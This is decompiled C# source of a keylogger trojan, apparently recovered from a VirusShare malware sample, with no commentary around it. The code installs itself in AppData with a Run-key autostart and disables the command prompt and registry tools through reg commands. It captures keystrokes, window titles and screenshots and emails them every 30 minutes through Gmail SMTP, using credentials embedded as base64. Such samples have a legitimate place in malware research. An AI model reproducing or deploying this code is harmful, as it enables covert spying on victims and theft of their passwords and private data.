// Decompiled with JetBrains decompiler
// Type: vnMbUEmoJlqEOjw
// Assembly: RSPG, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 66E0EE36-8348-4F63-AE75-DAD16E4ADD90
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00012-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-91743fd603f87e35dcb7c7b21b134958c49e7ef84ba1ae5e8292d32d86ce3e97.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using My;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

[StandardModule]
internal sealed class vnMbUEmoJlqEOjw
{
  private static string kWxUTuctfjKjuoH = "ZmF6ZGFuYUBnbWFpbC5jb20=";
  private static string FbwVOKVmBWKUrmQ = "YnJvbmNvczE=";
  private static string RxSXfVBKLJOlryd = "smtp.gmail.com";
  private static int qpGJMEcrkVDFZCH = 587;
  private static string cCRKtbeybftEZmZ;
  private static string MmJIkSjVZyZkewt;
  private static string QmLDyLcqMzJgbFH;
  private static string nINVLqzzyDahoTf;
  private static string fuyCtShaKruPrvK;
  private static string PFkttsxibiNaZps;
  private static int BMGYHdNYealDSZb = 1800000;
  private static string hEQeMdPTsheYqnL = (string) null;
  private static object URzNmmOWjLfKiza = (object) Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
  private static string kIDgiPVowlRNNLQ = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
  private static MailMessage CIPgHGWMPHfJnlT = new MailMessage();
  private static SmtpClient ZEnjYsiZnxggTGh = new SmtpClient();
  [AccessedThroughProperty("sdZNiYPdnWWJvWs")]
  private static EQeMdPTsheYqnLg _sdZNiYPdnWWJvWs;
  private static object wILavwHQLoEXrKF;
  private static RichTextBox vZEnjYsiZnxggTG;

  static vnMbUEmoJlqEOjw()
  {
    vnMbUEmoJlqEOjw.sdZNiYPdnWWJvWs = new EQeMdPTsheYqnLg();
    vnMbUEmoJlqEOjw.wILavwHQLoEXrKF = (object) Path.GetFileName(Application.ExecutablePath);
    vnMbUEmoJlqEOjw.vZEnjYsiZnxggTG = new RichTextBox();
  }

  private static EQeMdPTsheYqnLg sdZNiYPdnWWJvWs
  {
    get => vnMbUEmoJlqEOjw._sdZNiYPdnWWJvWs;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      if (vnMbUEmoJlqEOjw._sdZNiYPdnWWJvWs != null)
        EQeMdPTsheYqnLg.KeyDown -= new EQeMdPTsheYqnLg.KeyDownEventHandler(vnMbUEmoJlqEOjw.svnMbUEmoJlqEOj);
      vnMbUEmoJlqEOjw._sdZNiYPdnWWJvWs = value;
      if (vnMbUEmoJlqEOjw._sdZNiYPdnWWJvWs == null)
        return;
      EQeMdPTsheYqnLg.KeyDown += new EQeMdPTsheYqnLg.KeyDownEventHandler(vnMbUEmoJlqEOjw.svnMbUEmoJlqEOj);
    }
  }

  [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int GetForegroundWindow();

  [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int oGSGExQNjTekgrJ(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

  [STAThread]
  public static void main()
  {
    vnMbUEmoJlqEOjw.PFkttsxibiNaZps = Conversions.ToString(true);
    vnMbUEmoJlqEOjw.QmLDyLcqMzJgbFH = Conversions.ToString(true);
    vnMbUEmoJlqEOjw.nINVLqzzyDahoTf = Conversions.ToString(true);
    vnMbUEmoJlqEOjw.fuyCtShaKruPrvK = Conversions.ToString(false);
    vnMbUEmoJlqEOjw.MmJIkSjVZyZkewt = Conversions.ToString(true);
    vnMbUEmoJlqEOjw.cCRKtbeybftEZmZ = Conversions.ToString(true);
    if (!Operators.ConditionalCompareObjectEqual((object) Application.StartupPath, vnMbUEmoJlqEOjw.URzNmmOWjLfKiza, false))
    {
      using (System.IO.File.Create(Conversions.ToString(Operators.ConcatenateObject(vnMbUEmoJlqEOjw.URzNmmOWjLfKiza, (object) "\\xFVwvMCEvVxcaJw.txt"))))
        ;
      StreamWriter streamWriter = new StreamWriter(vnMbUEmoJlqEOjw.kIDgiPVowlRNNLQ + "\\xFVwvMCEvVxcaJw.txt");
      streamWriter.Write(Application.ExecutablePath);
      streamWriter.Flush();
      streamWriter.Close();
      if (System.IO.File.Exists(Conversions.ToString(Operators.AddObject(Operators.AddObject(vnMbUEmoJlqEOjw.URzNmmOWjLfKiza, (object) "\\"), vnMbUEmoJlqEOjw.wILavwHQLoEXrKF))))
      {
        MyProject.Computer.FileSystem.DeleteFile(Conversions.ToString(Operators.AddObject(Operators.AddObject(vnMbUEmoJlqEOjw.URzNmmOWjLfKiza, (object) "\\"), vnMbUEmoJlqEOjw.wILavwHQLoEXrKF)));
        MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, Conversions.ToString(Operators.AddObject(Operators.AddObject(vnMbUEmoJlqEOjw.URzNmmOWjLfKiza, (object) "\\"), vnMbUEmoJlqEOjw.wILavwHQLoEXrKF)));
      }
      else
        MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, Conversions.ToString(Operators.AddObject(Operators.AddObject(vnMbUEmoJlqEOjw.URzNmmOWjLfKiza, (object) "\\"), vnMbUEmoJlqEOjw.wILavwHQLoEXrKF)));
      NewLateBinding.LateCall((object) null, typeof (Process), "Start", new object[1]
      {
        Operators.AddObject(Operators.AddObject(vnMbUEmoJlqEOjw.URzNmmOWjLfKiza, (object) "\\"), vnMbUEmoJlqEOjw.wILavwHQLoEXrKF)
      }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
      ProjectData.EndApp();
    }
    if (Conversions.ToBoolean(vnMbUEmoJlqEOjw.cCRKtbeybftEZmZ) && RuntimeHelpers.GetObjectValue(Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).GetValue(Conversions.ToString(vnMbUEmoJlqEOjw.wILavwHQLoEXrKF))) == null)
      MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", Conversions.ToString(vnMbUEmoJlqEOjw.wILavwHQLoEXrKF), Operators.ConcatenateObject(Operators.ConcatenateObject(vnMbUEmoJlqEOjw.URzNmmOWjLfKiza, (object) "\\"), vnMbUEmoJlqEOjw.wILavwHQLoEXrKF));
    if (Conversions.ToBoolean(vnMbUEmoJlqEOjw.MmJIkSjVZyZkewt))
    {
      try
      {
        MyProject.Computer.FileSystem.DeleteFile(Conversions.ToString((object) MyProject.Computer.FileSystem.ReadAllText(Conversions.ToString(Operators.ConcatenateObject(vnMbUEmoJlqEOjw.URzNmmOWjLfKiza, (object) "\\xFVwvMCEvVxcaJw.txt")))));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
    if (Conversions.ToBoolean(vnMbUEmoJlqEOjw.QmLDyLcqMzJgbFH))
      Interaction.Shell("REG add HKCU\\Software\\Policies\\Microsoft\\Windows\\System /v DisableCMD /t REG_DWORD /d 1 /f", AppWinStyle.NormalFocus);
    if (Conversions.ToBoolean(vnMbUEmoJlqEOjw.nINVLqzzyDahoTf))
      Interaction.Shell("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f", AppWinStyle.NormalFocus);
    if (Conversions.ToBoolean(vnMbUEmoJlqEOjw.fuyCtShaKruPrvK))
      Interaction.Shell("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f", AppWinStyle.NormalFocus);
    System.Windows.Forms.Timer timer1 = new System.Windows.Forms.Timer();
    timer1.Interval = 1800000;
    timer1.Tick += new EventHandler(vnMbUEmoJlqEOjw.GUBTFJiWUOgdzWu_Ticked);
    timer1.Start();
    System.Windows.Forms.Timer timer2 = new System.Windows.Forms.Timer();
    timer2.Interval = 300;
    timer2.Tick += new EventHandler(vnMbUEmoJlqEOjw.BwILavwHQLoEXrK_Ticked);
    timer2.Start();
    vnMbUEmoJlqEOjw.sdZNiYPdnWWJvWs.FLHTWkGIRbWyPhC();
    Application.Run();
  }

  private static string KfgqOuYnUatCrXS()
  {
    string lpString = new string(char.MinValue, 100);
    vnMbUEmoJlqEOjw.oGSGExQNjTekgrJ(vnMbUEmoJlqEOjw.GetForegroundWindow(), ref lpString, 100);
    return lpString.Substring(0, checked (Strings.InStr(lpString, "\0") - 1));
  }

  public static string wkWxUTuctfjKjuo(string dqpGJMEcrkVDFZC) => Encoding.ASCII.GetString(Convert.FromBase64String(dqpGJMEcrkVDFZC));

  public static void GUBTFJiWUOgdzWu_Ticked(object sender, EventArgs e)
  {
    if (Conversions.ToBoolean(vnMbUEmoJlqEOjw.PFkttsxibiNaZps))
    {
      Size blockRegionSize = new Size(MyProject.Computer.Screen.Bounds.Width, MyProject.Computer.Screen.Bounds.Height);
      Bitmap bitmap = new Bitmap(MyProject.Computer.Screen.Bounds.Width, MyProject.Computer.Screen.Bounds.Height);
      Graphics.FromImage((Image) bitmap).CopyFromScreen(new Point(0, 0), new Point(0, 0), blockRegionSize);
      string Right = vnMbUEmoJlqEOjw.CVPFkttsxibiNaZ(6);
      bitmap.Save(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(vnMbUEmoJlqEOjw.URzNmmOWjLfKiza, (object) "\\"), (object) Right), (object) ".jpeg")));
      try
      {
        MailMessage message = new MailMessage();
        Attachment attachment = new Attachment(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(vnMbUEmoJlqEOjw.URzNmmOWjLfKiza, (object) "\\"), (object) Right), (object) ".jpeg")));
        message.From = new MailAddress(vnMbUEmoJlqEOjw.wkWxUTuctfjKjuo(vnMbUEmoJlqEOjw.kWxUTuctfjKjuoH));
        message.To.Add(vnMbUEmoJlqEOjw.wkWxUTuctfjKjuo(vnMbUEmoJlqEOjw.kWxUTuctfjKjuoH));
        message.Subject = "COOLogger Logs From - " + Environment.UserName;
        message.Body = vnMbUEmoJlqEOjw.vZEnjYsiZnxggTG.Text;
        message.Attachments.Add(attachment);
        SmtpClient smtpClient = new SmtpClient("smtp.gmail.com")
        {
          Port = 587,
          EnableSsl = true,
          Credentials = (ICredentialsByHost) new NetworkCredential(vnMbUEmoJlqEOjw.wkWxUTuctfjKjuo(vnMbUEmoJlqEOjw.kWxUTuctfjKjuoH), vnMbUEmoJlqEOjw.wkWxUTuctfjKjuo(vnMbUEmoJlqEOjw.FbwVOKVmBWKUrmQ))
        };
        smtpClient.EnableSsl = true;
        smtpClient.Send(message);
        vnMbUEmoJlqEOjw.vZEnjYsiZnxggTG.Text = "";
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
    else
    {
      MailMessage ciPgHgwmpHfJnlT = vnMbUEmoJlqEOjw.CIPgHGWMPHfJnlT;
      ciPgHgwmpHfJnlT.From = new MailAddress(vnMbUEmoJlqEOjw.wkWxUTuctfjKjuo(vnMbUEmoJlqEOjw.kWxUTuctfjKjuoH));
      ciPgHgwmpHfJnlT.To.Add(vnMbUEmoJlqEOjw.wkWxUTuctfjKjuo(vnMbUEmoJlqEOjw.kWxUTuctfjKjuoH));
      ciPgHgwmpHfJnlT.Subject = "COOLogger Logs from - " + Environment.UserName;
      ciPgHgwmpHfJnlT.Body = vnMbUEmoJlqEOjw.vZEnjYsiZnxggTG.Text;
      SmtpClient zenjYsiZnxggTgh = vnMbUEmoJlqEOjw.ZEnjYsiZnxggTGh;
      zenjYsiZnxggTgh.Host = "smtp.gmail.com";
      zenjYsiZnxggTgh.Port = 587;
      zenjYsiZnxggTgh.EnableSsl = true;
      zenjYsiZnxggTgh.Credentials = (ICredentialsByHost) new NetworkCredential(vnMbUEmoJlqEOjw.wkWxUTuctfjKjuo(vnMbUEmoJlqEOjw.kWxUTuctfjKjuoH), vnMbUEmoJlqEOjw.wkWxUTuctfjKjuo(vnMbUEmoJlqEOjw.FbwVOKVmBWKUrmQ));
      zenjYsiZnxggTgh.Send(vnMbUEmoJlqEOjw.CIPgHGWMPHfJnlT);
      vnMbUEmoJlqEOjw.vZEnjYsiZnxggTG.Text = "";
    }
  }

  public static void svnMbUEmoJlqEOj(Keys e) => vnMbUEmoJlqEOjw.vZEnjYsiZnxggTG.Text += vnMbUEmoJlqEOjw.sdZNiYPdnWWJvWs.VPFkttsxibiNaZp(e);

  public static void BwILavwHQLoEXrK_Ticked(object sender, EventArgs e)
  {
    if (Operators.CompareString(vnMbUEmoJlqEOjw.hEQeMdPTsheYqnL, vnMbUEmoJlqEOjw.KfgqOuYnUatCrXS(), false) == 0)
      return;
    vnMbUEmoJlqEOjw.hEQeMdPTsheYqnL = vnMbUEmoJlqEOjw.KfgqOuYnUatCrXS();
    if (Operators.CompareString(vnMbUEmoJlqEOjw.hEQeMdPTsheYqnL, "", false) == 0)
      return;
    RichTextBox vZenjYsiZnxggTg = vnMbUEmoJlqEOjw.vZEnjYsiZnxggTG;
    vZenjYsiZnxggTg.Text = vZenjYsiZnxggTg.Text + "\r\n\r\n~~~~~" + vnMbUEmoJlqEOjw.hEQeMdPTsheYqnL + " (" + DateAndTime.Now.ToLongTimeString() + ")~~~~~\r\n";
  }

  public static string CVPFkttsxibiNaZ(int lenght)
  {
    VBMath.Randomize();
    StringBuilder stringBuilder = new StringBuilder("");
    char[] charArray = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray();
    int num1 = lenght;
    int num2 = 1;
    while (num2 <= num1)
    {
      VBMath.Randomize();
      int index = checked ((int) Math.Round((double) unchecked (Conversion.Int((float) checked (charArray.Length - 2 - 0 + 1) * VBMath.Rnd()) + 1f)));
      stringBuilder.Append(charArray[index]);
      checked { ++num2; }
    }
    return stringBuilder.ToString();
  }
}
